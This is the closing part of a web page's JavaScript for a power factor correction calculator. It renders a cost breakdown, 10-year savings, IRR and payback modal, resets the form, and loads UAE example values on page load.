                        <h3 class="text-2xl font-bold mb-4 text-gray-800">Detailed Cost Analysis</h3>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <div>
                                <h4 class="text-lg font-semibold mb-3 text-gray-700">Project Cost Breakdown</h4>
                                <div class="space-y-2 text-sm">
                                    <div class="flex justify-between">
                                        <span>Capacitor Equipment:</span>
                                        <span class="font-semibold">$${equipmentCost.toFixed(0)}</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>Installation & Labor:</span>
                                        <span class="font-semibold">$${installationCost.toFixed(0)}</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>Protection & Control:</span>
                                        <span class="font-semibold">$${protectionCost.toFixed(0)}</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>Commissioning & Testing:</span>
                                        <span class="font-semibold">$${commissioning.toFixed(0)}</span>
                                    </div>
                                    <hr class="my-2">
                                    <div class="flex justify-between text-lg font-bold">
                                        <span>Total Project Cost:</span>
                                        <span class="text-red-600">$${totalProjectCost.toFixed(0)}</span>
                                    </div>
                                </div>
                            </div>
                            
                            <div>
                                <h4 class="text-lg font-semibold mb-3 text-gray-700">10-Year Financial Analysis</h4>
                                <div class="space-y-2 text-sm">
                                    <div class="flex justify-between">
                                        <span>Total Savings (10 years):</span>
                                        <span class="font-semibold text-green-600">$${totalSavings10Years.toFixed(0)}</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>Net Benefit:</span>
                                        <span class="font-semibold text-green-600">$${netBenefit10Years.toFixed(0)}</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>Internal Rate of Return:</span>
                                        <span class="font-semibold">${irr.toFixed(1)}%</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>Payback Period:</span>
                                        <span class="font-semibold">${results.paybackMonths.toFixed(1)} months</span>
                                    </div>
                                    <div class="flex justify-between">
                                        <span>NPV (5% discount):</span>
                                        <span class="font-semibold text-green-600">$${(netBenefit10Years * 0.7).toFixed(0)}</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="mt-6">
                            <h4 class="text-lg font-semibold mb-3 text-gray-700">Year-by-Year Savings (with 3% inflation)</h4>
                            <div class="grid grid-cols-5 gap-2 text-xs">
            `;
            
            yearlyBenefits.slice(0, 10).forEach((benefit, index) => {
                html += `
                    <div class="text-center p-2 bg-gray-100 rounded">
                        <div class="font-semibold">Year ${index + 1}</div>
                        <div class="text-green-600">$${benefit.toFixed(0)}</div>
                    </div>
                `;
            });
            
            html += `
                            </div>
                        </div>
                        
                        <div class="mt-6 p-4 bg-blue-50 rounded">
                            <h4 class="font-semibold text-blue-800 mb-2">Investment Recommendation</h4>
                            <p class="text-sm text-blue-700">
                                ${irr > 15 ? 
                                    '✅ <strong>Highly Recommended:</strong> Excellent ROI with IRR > 15%. This project will generate significant long-term savings.' :
                                    irr > 10 ?
                                    '✅ <strong>Recommended:</strong> Good ROI with IRR > 10%. Solid investment opportunity.' :
                                    '⚠️ <strong>Consider Carefully:</strong> Moderate ROI. Evaluate other factors like power quality improvements.'
                                }
                            </p>
                        </div>
                        
                        <button onclick="closeCostAnalysis()" class="mt-4 px-4 py-2 bg-gray-500 text-white rounded">Close</button>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', html);
        }

        function closeCostAnalysis() {
            const modal = document.querySelector('.fixed.inset-0');
            if (modal) modal.remove();
        }

        function resetForm() {
            // Reset all form fields
            document.getElementById('activePower').value = '';
            document.getElementById('presentPF').value = '';
            document.getElementById('targetPF').value = '';
            document.getElementById('demandCharge').value = '';
            document.getElementById('energyCost').value = '';
            document.getElementById('deratingFactor').value = '1.0';
            document.getElementById('operatingHours').value = '8760';
            document.getElementById('voltage').value = '0.4';
            document.getElementById('systemType').value = 'fixed';
            document.getElementById('customVoltage').value = '';
            document.getElementById('customVoltageDiv').style.display = 'none';
            
            // Remove selected class from country presets
            document.querySelectorAll('.country-preset').forEach(el => {
                el.classList.remove('selected');
            });
            
            // Hide charts section
            document.getElementById('chartsSection').style.display = 'none';
            
            // Destroy charts
            if (powerFactorChart) {
                powerFactorChart.destroy();
                powerFactorChart = null;
            }
            if (financialChart) {
                financialChart.destroy();
                financialChart = null;
            }
            
            // Clear results
            currentResults = null;
            document.getElementById('results').innerHTML = `
                <div class="info-box text-center">
                    <i class="fas fa-info-circle text-2xl mb-2"></i>
                    <p>Configure your country settings and system parameters, then click calculate to see results</p>
                </div>
            `;
        }

        // Initialize with example values
        window.onload = function() {
            // Load UAE preset by default
            loadCountryPreset('uae');
            document.getElementById('activePower').value = '500';
            document.getElementById('presentPF').value = '0.75';
            document.getElementById('targetPF').value = '0.95';
        };
    </script>
</body>
</html>



